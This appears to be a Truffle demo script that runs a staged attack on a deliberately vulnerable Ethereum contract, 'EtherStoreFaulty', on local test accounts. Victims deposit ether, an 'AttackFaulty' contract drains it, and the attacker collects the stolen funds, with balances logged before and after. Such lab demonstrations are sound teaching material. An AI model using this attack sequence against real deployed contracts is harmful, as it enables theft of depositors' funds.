const EtherStoreFaulty = artifacts.require("EtherStoreFaulty");
const AttackFaulty = artifacts.require("AttackFaulty");

module.exports = async function (callback) {
  let etherStore;
  let attack;
  let accounts;
  let attackerAddr;
  let victim1Addr;
  let victim2Addr;

  async function getAccounts() {
    return web3.eth.getAccounts();
  }

  async function getBalance(address) {
    return web3.eth.getBalance(address);
  }

  function logAddresses() {
    console.log(`EtherStoreFaulty address: ${etherStore.address}`);
    console.log(`Victim 1 account address: ${victim1Addr}`);
    console.log(`Victim 2 account address: ${victim2Addr}`);
    console.log(`AttackFaulty address: ${attack.address}`);
    console.log(`Attacker account address: ${attackerAddr}`);
    console.log("\n");
  }

  async function logAddressesBalances() {
    const victim1Balance = await etherStore
      .balances(victim1Addr)
      .catch((e) => console.log(e));

    const victim2Balance = await etherStore
      .balances(victim2Addr)
      .catch((e) => console.log(e));

    console.log(
      `EtherStoreFaulty balance: ${toEther(
        await getBalance(etherStore.address)
      )} ether`
    );
    console.log(
      `EtherStoreFaulty victim 1 balance: ${toEther(
        victim1Balance.toString()
      )} ether`
    );
    console.log(
      `EtherStoreFaulty victim 2 balance: ${toEther(
        victim2Balance.toString()
      )} ether`
    );
    console.log(
      `AttackFaulty balance: ${toEther(await getBalance(attack.address))} ether`
    );
    console.log(
      `Attacker balance: ${toEther(await getBalance(attackerAddr))} ether`
    );
    console.log("\n");
  }

  function toEther(wei) {
    return web3.utils.fromWei(wei, "ether");
  }

  // Get an account
  accounts = await getAccounts();
  attackerAddr = accounts[0];
  victim1Addr = accounts[1];
  victim2Addr = accounts[2];

  // Contracts instances
  etherStore = await EtherStoreFaulty.deployed().catch((e) => console.log(e));
  attack = await AttackFaulty.deployed().catch((e) => console.log(e));

  // Logs before the attack
  console.log("1. Addresses, and balances before the attack\n");

  logAddresses();
  await logAddressesBalances();

  // Victims deposit funds into EtherStoreFaulty contract
  console.log("2. Victims deposit funds in EtherStoreFaulty\n");

  await etherStore
    .depositFunds({
      value: web3.utils.toWei("5", "ether"),
      from: victim1Addr,
    })
    .catch((e) => console.log(e));

  await etherStore
    .depositFunds({
      value: web3.utils.toWei("5", "ether"),
      from: victim2Addr,
    })
    .catch((e) => console.log(e));

  await logAddressesBalances();

  // Attacker gets the ownership of the Attack contract and funds it
  //   console.log("Attacker funding AttackFaulty...\n");

  //   await attack
  //     .send(web3.utils.toWei("0.1", "ether"), {from: attackerAccount})
  //     .catch((e) => console.log(e));

  //   console.log(
  //     `AttackFaulty balance before: ${toEther(
  //       await getBalance(attackerAccount)
  //     )} ether\n`
  //   );

  // Attack part 1: Attack EtherStoreFaulty via AttackFaulty
  console.log("3. Attack EtherStoreFaulty\n");

  await attack
    .attackEtherStoreFaulty({
      value: web3.utils.toWei("1", "ether"),
      from: attackerAddr,
    })
    .catch((e) => console.log(e));

  await logAddressesBalances();

  // Attack part 2: Collect stolen funds (from AttackFaulty to attacker)
  console.log("4. Collect the stolen funds\n");

  await attack.collectEther().catch((e) => console.log(e));

  // Logs after the attack
  await logAddressesBalances();

  callback();
};
